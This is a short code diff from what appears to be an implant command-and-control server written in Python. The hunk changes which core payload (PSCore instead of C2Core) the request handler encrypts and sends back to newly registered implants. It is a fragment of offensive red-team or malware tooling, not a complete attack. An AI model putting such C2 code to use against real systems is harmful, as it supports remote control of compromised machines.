@@ -200,7 +200,7 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
               newImplant.save()
               newImplant.display()
               newImplant.autoruns()
-              responseVal = encrypt(KEY, newImplant.C2Core)
+              responseVal = encrypt(KEY, newImplant.PSCore)
 
               s.send_response(200)
               s.send_header("Content-type", "text/html")
